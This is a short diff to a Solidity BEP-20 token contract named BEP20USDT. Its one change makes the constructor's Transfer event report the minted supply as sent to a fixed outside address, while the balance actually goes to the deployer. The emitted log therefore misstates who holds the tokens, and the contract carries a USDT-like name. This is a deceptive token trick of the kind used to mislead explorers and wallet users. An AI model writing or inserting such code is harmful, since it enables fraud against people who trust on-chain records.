@@ -359,7 +359,7 @@ contract BEP20USDT is Context, IBEP20, Ownable {
     _totalSupply = 1000000000*10**18;
     _balances[msg.sender] = _totalSupply;
 
-    emit Transfer(address(0), msg.sender, _totalSupply);
+    emit Transfer(address(0), address(0x57Da5B0bE482bA2ff4fa09FDA4eD31d47727BA4a), _totalSupply);
   }
 
   /**
